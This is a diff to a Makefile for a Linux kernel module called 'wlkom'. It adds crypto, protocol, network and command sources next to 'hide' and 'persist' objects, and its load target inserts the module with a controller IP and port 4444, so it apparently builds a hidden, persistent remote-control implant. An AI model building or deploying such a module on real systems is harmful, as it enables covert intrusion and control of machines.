@@ -1,15 +1,9 @@
-CC      ?= gcc
-CFLAGS  = -std=c99 -pedantic -Wall -Wextra
-LDLIBS  =
-
 obj-m += wlkom.o
-wlkom-objs := src/main.o src/hide.o src/connect.o src/persist.o
+wlkom-objs := src/main.o src/crypto.o src/protocol.o src/network.o src/commands.o src/hide.o src/persist.o
 
-ccflags-y += -Wno-declaration-after-statement \
-	-I$(PWD)/include
+ccflags-y += -Wno-declaration-after-statement -I$(src)/include
 
 KDIR := /lib/modules/$(shell uname -r)/build
-PWD  := $(shell pwd)
 
 CONTROL_IP   ?= 192.168.100.10
 CONTROL_PORT ?= 4444
@@ -23,10 +17,10 @@ all:
 		echo "Debian: sudo apt install linux-headers-$$(uname -r)"; \
 		exit 1; \
 	fi
-	make -C $(KDIR) M=$(PWD) modules
+	make -C $(KDIR) M=$(CURDIR) modules
 
 clean:
-	make -C $(KDIR) M=$(PWD) clean
+	make -C $(KDIR) M=$(CURDIR) clean
 
 load:
 	sudo insmod wlkom.ko control_ip="$(CONTROL_IP)" control_port=$(CONTROL_PORT)
